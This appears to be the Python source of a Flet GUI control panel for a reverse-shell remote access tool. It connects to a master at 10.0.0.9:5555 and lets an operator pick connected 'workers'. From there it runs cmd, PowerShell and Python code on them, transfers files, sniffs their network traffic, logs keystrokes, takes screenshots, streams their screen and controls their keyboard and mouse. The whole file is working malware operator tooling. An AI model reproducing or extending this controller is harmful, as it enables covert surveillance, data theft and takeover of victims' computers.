from typing import Callable
from flet.core.dropdown import DropdownOption
from rs_master import Master
import flet as ft
from flet.core.types import FontWeight
import threading
def get_options(functions:list[str],type:str) -> list[DropdownOption]:
    options_list = []
    if type == "commends":
        for function in functions:
            if function in ["live_stream","press_key_in_worker","control_mouse"]:
                continue
            options_list.append(ft.DropdownOption(key=function))
    else:
        for function in ["press_key_in_worker","control_mouse"]:
            options_list.append(ft.DropdownOption(key=function))
    return options_list

class App:
    def __init__(self):
        self.input_required_functions: dict[str,Callable[[],ft.AlertDialog]]= {"cmd" : self.cmd,"python":self.python,"powershell":self.powershell,"receive_file":self.receive_file,"send_file":self.send_file,"sniff_from_worker":self.sniff_from_worker}
        self.page: ft.Page | None = None
        self.master = Master("10.0.0.9",5555)
        threading.Thread(target = self.master.connect, daemon=True).start()
        self.title = ft.Container(
            content=ft.Text("reverse shell", size=40, italic=True, weight=FontWeight.BOLD),
            alignment=ft.alignment.top_center,
            bgcolor=ft.Colors.AMBER,
            margin=10,
            padding=10,
            border_radius=10
        )
        self.commands = ft.Dropdown(
            border=ft.InputBorder.UNDERLINE,
            enable_filter=True,
            editable=True,
            leading_icon=ft.Icons.SEARCH,
            label= "command",
            options= get_options(self.master.functions,"commends"),
            on_change=self.choose_command,
            disabled=True
        )
        self.workers = ft.Dropdown(
            border=ft.InputBorder.UNDERLINE,
            enable_filter=True,
            editable=True,
            label="workers",
            options=[ft.DropdownOption(key = key) for key in self.master.clients.keys()],
            on_change=self.chosen_client
        )
        self.output_box =ft.DataTable(
            vertical_lines=ft.BorderSide(3, ft.Colors.GREY),
            horizontal_lines=ft.BorderSide(1, ft.Colors.BLUE_ACCENT),
            divider_thickness=0,
            data_row_max_height=300,
            width=15000,

            columns=[
                ft.DataColumn(ft.Text("output:", size=30, italic=True, weight=FontWeight.BOLD,
                                      text_align=ft.TextAlign.LEFT)),

            ]

        )
        self.listen = True
        self.livestream = ft.Checkbox(label="live stream", on_change=self.live_steam_pressed, disabled=True)
        self.control_keys = ft.Checkbox(label="control the keys of the worker", on_change=self.control_keys_pressed, disabled=True)
        self.control_mouse = ft.Checkbox(label="control the mouse of the worker", on_change=self.control_mouse_of_worker, disabled=True)
        self.master.on_stream_stop = self.live_stream_stopped
        self.master.update_clients = self.update_clients
        self.dlg:ft.AlertDialog | None= None
        threading.Thread(target=self.master.show_stream, daemon=True).start()
        threading.Thread(target=self.master.control_keys,daemon=True).start()
        threading.Thread(target=self.master.control_mouse_on_worker, daemon=True).start()




    def chosen_client(self, e):
        self.control_mouse.disabled = False
        self.control_keys.disabled = False
        self.livestream.disabled = False
        self.commands.disabled = False
        self.master.cur_ip = self.workers.value
        self.page.update()
    def control_mouse_of_worker(self,e):
        self.master.control_mouse = self.control_mouse.value
    def control_keys_pressed(self,e):
        self.master.control_key = self.control_keys.value

    def update_clients(self):
        self.workers.options = [ft.DropdownOption(key = key) for key in self.master.clients.keys()]
        if self.page:
            self.page.update()

    def live_stream_stopped(self):
        self.livestream.value = False
        self.page.update()

    def live_steam_pressed(self,e):
        self.master.streaming = self.livestream.value

    def exit_button_pressed(self,e):
        self.listen = False
    def add_output(self, message:str):
        self.output_box.rows.insert(0,ft.DataRow(
            [ft.DataCell(ft.Text(message,text_align=ft.TextAlign.CENTER))]
        ))
        self.page.update()

    def cmd(self) -> ft.AlertDialog:
        return ft.AlertDialog(title="enter the cmd command you want to run in the worker:",
                              content=ft.TextField(border=ft.InputBorder.UNDERLINE, filled=True,on_submit=self.send_button_pressed))

    def powershell(self) -> ft.AlertDialog:
        return ft.AlertDialog(title="enter the powershell command you want to run in the worker",content=ft.TextField(border=ft.InputBorder.UNDERLINE, filled=True,on_submit=self.send_button_pressed))


    def python(self) -> ft.AlertDialog:
        text_field = ft.TextField(border=ft.InputBorder.UNDERLINE, filled=True,multiline = True,min_lines = 1,max_lines = 3,
                                                   on_submit=self.send_button_pressed, shift_enter=True)
        dlg = ft.AlertDialog(title="enter the python code you want to run in the worker. make sure the spacing is correct and you can enter multiple lines by pressing shift+enter",
                              content=text_field)

        return dlg

    def receive_file(self) -> ft.AlertDialog:
        return ft.AlertDialog(
            title="enter the path of the file you want in the worker side",
            content=ft.TextField(border=ft.InputBorder.UNDERLINE, filled=True,
                                 on_submit=self.send_button_pressed))

    def send_file(self) -> ft.AlertDialog:
        return ft.AlertDialog(
            title="enter the file path you want to send to worker, pick a name for the file in the worker side. separate the two with a \",\"",
            content=ft.TextField(border=ft.InputBorder.UNDERLINE, filled=True,
                                 on_submit=self.send_button_pressed))
    def sniff_from_worker(self) -> ft.AlertDialog:
        return ft.AlertDialog(
            title="enter: your filter for the sniffing,the sniffing time, amount of packets. all separated by a \",\" REMEMBER when you are asked to enter the file name the file type is .pcap",
            content=ft.TextField(border=ft.InputBorder.UNDERLINE, filled=True,
                                 on_submit=self.send_button_pressed))

    def save_file(self,received: bytes) -> str:
        def check_name(e):
            nonlocal file_name
            nonlocal dlg
            if e.control.value == "" or "." not in e.control.value:
                e.control.value = ""
            else:
                file_name = e.control.value
                self.page.close(dlg)
        file_name = ""
        dlg = ft.AlertDialog(title="please enter a name for your file:", modal=True,
                       content=ft.TextField(border=ft.InputBorder.UNDERLINE, filled=True, on_submit=check_name))
        self.page.open(dlg)
        while file_name == "":
            continue
        with open(file_name, "wb") as file:
            file.write(received)
        return f"file saved as {file_name}"

    def send_button_pressed(self,e):
        if e.control.value is None:
            return
        function = self.commands.value
        message = e.control.value
        message = message.replace(" ","")
        message = message.replace(",",":")
        if function in ["send_file","sniff_from_worker"] and ":" not in message:
            self.page.open(ft.AlertDialog(content=ft.Text("you must enter a \",\" press the \"?\" for more instructions")))
            return
        received = self.master.run2(function,message.encode())
        if b"error" in received:
            self.add_output(received.decode())
            return
        if function in ["receive_file","sniff_from_worker"]:
            self.page.close(self.dlg)
            self.save_file(received)
            return
        self.add_output(received.decode())

        self.page.close(self.dlg)


    def choose_command(self,e):
        if self.commands.value is None:
            return
        function = self.commands.value
        if function in self.input_required_functions.keys():
            self.dlg = self.input_required_functions[function]()
            self.page.open(self.dlg)
        else:
            if function == "screen_shot":
                self.save_file(self.master.run2(function,function.encode()))
            else:
                while self.listen:
                    self.add_output(self.master.run2("listen_to_keys", "listen_to_keys".encode()).decode())
                self.listen = True
                self.add_output(self.master.run2("stop_listen_to_keys", b"stop_listen_to_keys").decode())

    def main(self,page:ft.Page):
        self.page = page
        self.page.floating_action_button = ft.FloatingActionButton(
            icon=ft.Icons.CLOSE_SHARP, on_click=self.exit_button_pressed, bgcolor=ft.Colors.RED
        )
        self.page.bgcolor = ft.Colors.BLACK
        self.page.add(
                self.title,
                        ft.Row(
                        controls=[
                            ft.Container(
                                content=ft.DataTable(
                                    divider_thickness=0,
                                    vertical_lines=ft.BorderSide(color=ft.Colors.BLACK, width=1),
                                    horizontal_lines=ft.BorderSide(color=self.page.bgcolor, width=0),
                                    columns=[ft.DataColumn(self.workers)],
                                    rows=[
                                        ft.DataRow([ft.DataCell(self.commands)]),
                                        ft.DataRow([ft.DataCell(self.livestream)]),
                                        ft.DataRow([ft.DataCell(self.control_keys)]),
                                        ft.DataRow([ft.DataCell(self.control_mouse)])
                                    ]

                                ),
                                bgcolor = ft.Colors.PURPLE_400,
                                alignment = ft.alignment.top_center,
                                width = 400,
                                margin = 10,
                                padding = 10,
                                border_radius = 10,
                            ),
                            ft.VerticalDivider(width=6, thickness=3),
                            ft.Container(
                                alignment=ft.alignment.top_center,
                                content=ft.ListView(controls=[self.output_box]),
                                bgcolor=ft.Colors.BLUE_ACCENT,
                                expand=True,
                                margin=10,
                                padding=10,
                                border_radius=10,
                            ),

                        ],
                        spacing = 0,
                        expand = True,
                        )
        )


ft.app(App().main)